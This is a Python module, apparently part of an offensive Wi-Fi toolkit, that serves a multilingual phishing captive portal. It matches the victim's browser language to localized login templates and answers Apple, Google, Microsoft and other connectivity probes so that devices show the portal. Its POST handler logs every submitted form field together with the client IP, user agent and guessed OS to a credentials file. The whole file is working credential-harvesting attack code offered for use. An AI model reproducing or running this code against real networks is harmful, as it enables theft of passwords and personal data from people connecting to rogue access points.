#!/usr/bin/env python3
# Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
"""i18n microservice — language detection and template rendering for phishing portals.

Detects the client's preferred language from the HTTP ``Accept-Language``
header and renders phishing HTML templates in the matching locale.

Supported locale families:
  en-us   English US (default fallback)
  en-*    English (generic)
  pt-br   Portuguese (Brazil)
  pt-pt   Portuguese (Portugal)
  es-*    Spanish (any variant)

Architecture:
  1. ``detect_locale(accept_language_header)`` parses RFC 7231 §5.3.5
     quality-weighted language tags and returns the best matching locale key.
  2. ``load_strings(template_name, locale)`` loads the corresponding
     ``strings.json`` from the template directory.
  3. ``render_template(template_dir, filename, locale)`` reads the HTML
     file and replaces ``{{key}}`` placeholders with locale-specific strings.
  4. ``I18nPortalHandler`` is a drop-in ``http.server`` handler that
     auto-detects locale per request and serves rendered HTML.

Version: 1.0.0
"""

from __future__ import annotations

import http.server
import json
import logging
import re
from pathlib import Path
from typing import Any, Dict, List, Optional, Tuple
from urllib.parse import parse_qs

logger = logging.getLogger(__name__)

SUPPORTED_LOCALES: Tuple[str, ...] = ("en", "pt-br", "pt-pt", "es")
DEFAULT_LOCALE: str = "en"

_LOCALE_FAMILY_MAP = {
    "en": "en",
    "en-us": "en",
    "en-gb": "en",
    "en-au": "en",
    "pt": "pt-br",
    "pt-br": "pt-br",
    "pt-pt": "pt-pt",
    "es": "es",
    "es-es": "es",
    "es-mx": "es",
    "es-ar": "es",
    "es-co": "es",
    "es-cl": "es",
    "es-pe": "es",
    "es-419": "es",
}

_PLACEHOLDER_RE = re.compile(r"\{\{(\w+)\}\}")


def parse_accept_language(header: str) -> List[Tuple[str, float]]:
    """Parse ``Accept-Language`` header into (tag, quality) pairs sorted by q.

    Args:
        header: Raw Accept-Language value, e.g. ``pt-BR,pt;q=0.9,en-US;q=0.8``

    Returns:
        Descending-quality list of ``(normalised_tag, quality)`` tuples.
    """
    if not header:
        return []

    items: List[Tuple[str, float]] = []
    for part in header.split(","):
        part = part.strip()
        if not part:
            continue
        if ";q=" in part.lower():
            tag, _, q_str = part.partition(";")
            tag = tag.strip().lower()
            try:
                q = float(q_str.split("=", 1)[1].strip())
            except (ValueError, IndexError):
                q = 1.0
        else:
            tag = part.strip().lower()
            q = 1.0
        items.append((tag, q))

    items.sort(key=lambda x: x[1], reverse=True)
    return items


def detect_locale(accept_language: str) -> str:
    """Detect best matching locale from Accept-Language header.

    Args:
        accept_language: Raw header value.

    Returns:
        One of :data:`SUPPORTED_LOCALES`, defaulting to ``"en"``.
    """
    candidates = parse_accept_language(accept_language)
    for tag, _q in candidates:
        if tag in _LOCALE_FAMILY_MAP:
            return _LOCALE_FAMILY_MAP[tag]

        prefix = tag.split("-")[0]
        if prefix in _LOCALE_FAMILY_MAP:
            return _LOCALE_FAMILY_MAP[prefix]

    return DEFAULT_LOCALE


def load_strings(template_dir: Path, locale: str) -> Dict[str, str]:
    """Load translation strings from ``strings.json`` inside template dir.

    Falls back to ``"en"`` if the requested locale key is absent.

    Args:
        template_dir: Path to the phishing template folder.
        locale: Locale key (e.g. ``"pt-br"``).

    Returns:
        Flat dict of ``{placeholder: translated_value}``.
    """
    strings_file = template_dir / "strings.json"
    if not strings_file.exists():
        logger.debug("No strings.json in %s — returning empty dict", template_dir)
        return {}

    with open(strings_file, "r", encoding="utf-8") as fh:
        all_strings: Dict[str, Dict[str, str]] = json.load(fh)

    if locale in all_strings:
        return all_strings[locale]
    if DEFAULT_LOCALE in all_strings:
        return all_strings[DEFAULT_LOCALE]
    return {}


def render_template(
    template_dir: Path,
    filename: str,
    locale: str,
    extra_vars: Optional[Dict[str, str]] = None,
) -> str:
    """Render an HTML template file with locale-specific strings.

    Replaces ``{{key}}`` placeholders in the HTML with values from
    ``strings.json`` for the given locale.

    Args:
        template_dir: Path to the phishing template folder.
        filename: HTML file inside the template dir (e.g. ``"index.html"``).
        locale: Detected locale key.
        extra_vars: Additional variables to inject (e.g. SSID, brand).

    Returns:
        Rendered HTML string.
    """
    html_path = template_dir / filename
    if not html_path.exists():
        return "<html><body>Template not found</body></html>"

    html = html_path.read_text(encoding="utf-8")
    strings = load_strings(template_dir, locale)

    if extra_vars:
        strings.update(extra_vars)

    def _replacer(match: re.Match) -> str:
        key = match.group(1)
        return strings.get(key, match.group(0))

    return _PLACEHOLDER_RE.sub(_replacer, html)


class I18nPortalHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler with automatic locale detection and template rendering.

    Class-level attributes (set before server start):
        template_dir:     Path to the active phishing template.
        portal_host:      Gateway IP for redirect (e.g. ``"10.0.0.1"``).
        cred_log:         Path to credentials JSON log.
        extra_vars:       Extra template variables (e.g. ``{"ssid": "..."}``)
        connectivity_detect:  Handle OS connectivity probes.
    """

    template_dir: Path = Path(".")
    portal_host: str = "10.0.0.1"
    cred_log: Path = Path(".log/portal_creds.json")
    extra_vars: Dict[str, str] = {}
    connectivity_detect: bool = True

    _CONNECTIVITY_PATHS = {
        "/hotspot-detect.html": "apple",
        "/library/test/success.html": "apple",
        "/generate_204": "google",
        "/gen_204": "google",
        "/connecttest.txt": "microsoft",
        "/redirect": "microsoft",
        "/ncsi.txt": "microsoft",
        "/success.txt": "firefox",
        "/canonical.html": "firefox",
        "/kindle-wifi/wifistub.html": "amazon",
        "/check_network_status.txt": "samsung",
    }

    def _detect_locale(self) -> str:
        """Detect client locale from Accept-Language."""
        return detect_locale(self.headers.get("Accept-Language", ""))

    def _serve_rendered(self, filename: str, locale: str) -> None:
        """Render and serve an HTML template in the detected locale."""
        html = render_template(self.template_dir, filename, locale, self.extra_vars)
        encoded = html.encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(encoded)))
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(encoded)

    def do_GET(self) -> None:
        """Handle GET — connectivity detection + locale-aware template."""
        path = self.path.split("?")[0]

        if self.connectivity_detect and path in self._CONNECTIVITY_PATHS:
            os_type = self._CONNECTIVITY_PATHS[path]
            logger.info("CNA probe (%s) from %s", os_type, self.client_address[0])

            if os_type == "apple":
                self.send_response(200)
                self.send_header("Content-Type", "text/html")
                self.end_headers()
                self.wfile.write(
                    b"<HTML><HEAD><TITLE>Success</TITLE></HEAD><BODY>Success</BODY></HTML>"
                )
            else:
                self.send_response(302)
                self.send_header("Location", "http://{}/".format(self.portal_host))
                self.end_headers()
            return

        locale = self._detect_locale()
        logger.debug("Client %s locale=%s", self.client_address[0], locale)

        if path in ("/", "/index.html", "/login"):
            self._serve_rendered("index.html", locale)
        elif path == "/success.html":
            self._serve_rendered("success.html", locale)
        else:
            static = self.template_dir / path.lstrip("/")
            if static.exists() and static.is_file():
                data = static.read_bytes()
                self.send_response(200)
                ct = "text/css" if path.endswith(".css") else "application/octet-stream"
                if path.endswith(".js"):
                    ct = "application/javascript"
                elif path.endswith(".png"):
                    ct = "image/png"
                elif path.endswith(".svg"):
                    ct = "image/svg+xml"
                self.send_header("Content-Type", ct)
                self.end_headers()
                self.wfile.write(data)
            else:
                self.send_response(302)
                self.send_header("Location", "/")
                self.end_headers()

    def do_POST(self) -> None:
        """Handle POST — capture credentials, then serve success in locale."""
        content_length = int(self.headers.get("Content-Length", 0))
        body = self.rfile.read(content_length).decode("utf-8", errors="replace")
        params = parse_qs(body)

        locale = self._detect_locale()

        ua = self.headers.get("User-Agent", "")
        os_hint = "unknown"
        ua_low = ua.lower()
        if "iphone" in ua_low or "ipad" in ua_low or "macintosh" in ua_low:
            os_hint = "apple"
        elif "android" in ua_low:
            os_hint = "android"
        elif "windows" in ua_low:
            os_hint = "windows"
        elif "linux" in ua_low:
            os_hint = "linux"

        entry = {
            "client_ip": self.client_address[0],
            "user_agent": ua,
            "os_hint": os_hint,
            "locale": locale,
            "params": {k: v[0] if len(v) == 1 else v for k, v in params.items()},
        }

        self.cred_log.parent.mkdir(parents=True, exist_ok=True)
        with open(self.cred_log, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(entry, ensure_ascii=False) + "\n")

        logger.info("Credential captured: ip=%s os=%s locale=%s",
                     self.client_address[0], os_hint, locale)

        self._serve_rendered("success.html", locale)

    def log_message(self, fmt: str, *args: Any) -> None:
        """Suppress default logging — use module logger instead."""
        logger.debug(fmt, *args)
